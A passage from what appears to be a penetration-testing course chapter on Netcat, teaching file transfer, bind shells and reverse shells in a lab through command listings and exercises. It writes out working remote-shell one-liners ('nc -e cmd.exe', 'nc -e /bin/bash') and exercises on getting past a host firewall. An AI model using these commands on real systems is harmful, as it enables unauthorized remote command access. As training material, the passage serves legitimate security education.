
Although this isn't a very exciting example, it demonstrates several important features in Netcat. Try to answer these important questions before proceeding:

- Which machine acted as the Netcat server?
- Which machine acted as the Netcat client?
- On which machine was port 4444 actually opened?
- What is the command-line syntax difference between the client and server?

### 4.1.3 Transferring Files with Netcat

Netcat can also be used to transfer files, both text and binary, from one computer to another. In fact, forensics investigators often use Netcat in conjunction with **dd** (a disk copying utility) to create forensically sound disk images over a network.

To send a file from our Kali virtual machine to the Windows system, we initiate a setup that is similar to the previous chat example, with some slight differences. On the Windows machine, we will set up a Netcat listener on port 4444 and redirect any output into a file called **incoming.exe**.

```text
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
```

*Listing 82 - Using nc to receive a file*

On the Kali system, we will push the **wget.exe** file to the Windows machine through TCP port 4444:

```bash
kali@kali:~$ locate wget.exe
/usr/share/windows-resources/binaries/wget.exe

kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Listing 83 - Using nc to transfer a file*

The connection is received by Netcat on the Windows machine as shown below:

```text
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN> [10.11.0.4] 43459
^C
C:\Users\offsec>
```

*Listing 84 - Connection received on Windows*

Notice that we have not received any feedback from Netcat about our file upload progress. In this case, since the file we are uploading is small, we can just wait a few seconds, then check whether the file has been fully uploaded to the Windows machine by attempting to run it:

```text
C:\Users\offsec> incoming.exe -h
GNU Wget 1.9.1, a non-interactive network retriever.
Usage: incoming [OPTION]... [URL]...
```

*Listing 85 - Executing file sent through nc. The -h option displays the help menu*

We can see that this is, in fact, the **wget.exe** executable and that the file transfer was successful.

### 4.1.4 Remote Administration with Netcat

One of the most useful features of Netcat is its ability to do command redirection. The netcat-traditional version of Netcat (compiled with the "DGAPING_SECURITY_HOLE" flag) enables the `-e` option, which executes a program after making or receiving a successful connection. This powerful feature opened up all sorts of interesting possibilities from a security perspective and is therefore not available in most modern Linux/BSD systems. However, due to the fact that Kali Linux is a penetration testing distribution, the Netcat version included in Kali supports the `-e` option.

When enabled, this option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.

For example, consider the `cmd.exe` executable. By redirecting `stdin`, `stdout`, and `stderr` to the network, we can bind `cmd.exe` to a local port. Anyone connecting to this port will be presented with a command prompt on the target computer.

To clarify this, let’s run through a few more scenarios involving Bob and Alice.

#### 4.1.4.1 Netcat Bind Shell Scenario

In our first scenario, Bob (running Windows) has requested Alice’s assistance (who is running Linux) and has asked her to connect to his computer and issue some commands remotely. Bob has a public IP address and is directly connected to the Internet. Alice, however, is behind a NATed connection, and has an internal IP address. To complete the scenario, Bob needs to bind `cmd.exe` to a TCP port on his public IP address and asks Alice to connect to his particular IP address and port.

Bob will check his local IP address, then run Netcat with the `-e` option to execute `cmd.exe` once a connection is made to the listening port:

```text
C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix . . : :
IPv4 Address. . . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . . : 255.255.0.0
Default Gateway . . . . . . . . . . : 10.11.0.1
C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
listening on [any] 4444 ...
```

Now Netcat has bound TCP port 4444 to `cmd.exe` and will redirect any input, output, or error messages from `cmd.exe` to the network. In other words, anyone connecting to TCP port 4444 on Bob’s machine (hopefully Alice) will be presented with Bob’s command prompt. This is indeed a “gaping security hole”!

```bash
kali@kali:~$ ip address show eth0 | grep inet
    inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0
kali@kali:~$ nc -nv 10.11.0.22 4444
(UNKNOWN) [10.11.0.22] 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
```

```text
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
    Connection-specific DNS Suffix  . :
    IPv4 Address. . . . . . . . . . . : 10.11.0.22
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : 10.11.0.1
```

*Listing 87 - Using nc to connect to a bind shell*

As we can see, this works just as expected. The following image depicts this scenario:

![](img/ec25e59d75726b7041242a56d3376832_79_0.png)

*Figure 8: Netcat bind shell scenario*

#### 4.1.4.2 Reverse Shell Scenario

In our second scenario, Alice needs help from Bob. However, Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her internal machine.

In this scenario, we can leverage another useful feature of Netcat; the ability to send a command shell to a host listening on a specific port. In this situation, although Alice cannot bind a port to `/bin/bash` locally on her computer and expect Bob to connect, she can send control of her command prompt to Bob’s machine instead. This is known as a *reverse shell*. To get this working, Bob will first set up Netcat to listen for an incoming shell. We will use port 4444 in our example:

```text
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
```

*Listing 88 - Using nc to set up a listener in order to receive a reverse shell*

Now, Alice can send a reverse shell from her Linux machine to Bob. Once again, we use the `-e` option to make an application available remotely, which in this case happens to be `/bin/bash`, the Linux shell:

```bash
kali@kali:~$ ip address show eth0 | grep inet
     inet 10.11.0.4/16 brd 10.11.255.255    scope global dynamic eth0
kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

*Listing 89 - Using nc to send a reverse shell*

Once the connection is established, Alice’s Netcat will have redirected `/bin/bash` input, output, and error data streams to Bob’s machine on port 4444, and Bob can interact with that shell:

```text
C:\Users\offsec>nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN> [10.11.0.4] 43482
ip address show eth0 | grep inet
     inet 10.11.0.4/16 brd 10.11.255.255    scope global dynamic eth0
```

*Listing 90 - Using nc to receive a reverse shell*

Take some time to consider the differences between bind and reverse shells, and how these differences may apply to various firewall configurations from an organizational security standpoint. It is important to realize that outgoing traffic can be just as harmful as incoming traffic. The following image depicts the reverse shell scenario where Bob gets remote shell access on Alice’s Linux machine, traversing the corporate firewall:

![](img/ec25e59d75726b7041242a56d3376832_81_0.png)

> It’s not uncommon for host-based firewalls to block access to our precious bind shells. This can be incredibly frustrating at times, especially when under pressure and dealing with time constraints. When in doubt, we use a reverse shell as they are typically easier to troubleshoot.

#### 4.1.4.3 Exercises

(Reporting is not required for these exercises)

1. Implement a simple chat between your Kali machine and Windows system.
2. Use Netcat to create a:
   - a. Reverse shell from Kali to Windows.
   - b. Reverse shell from Windows to Kali.
   - c. Bind shell on Kali. Use your Windows system to connect to it.
   - d. Bind shell on Windows. Use your Kali machine to connect to it.
3. Transfer a file from your Kali machine to Windows and vice versa.
4. Conduct the exercises again with the firewall enabled on your Windows system. Adapt the exercises as necessary to work around the firewall protection and understand what portions of the exercise can no longer be completed successfully.
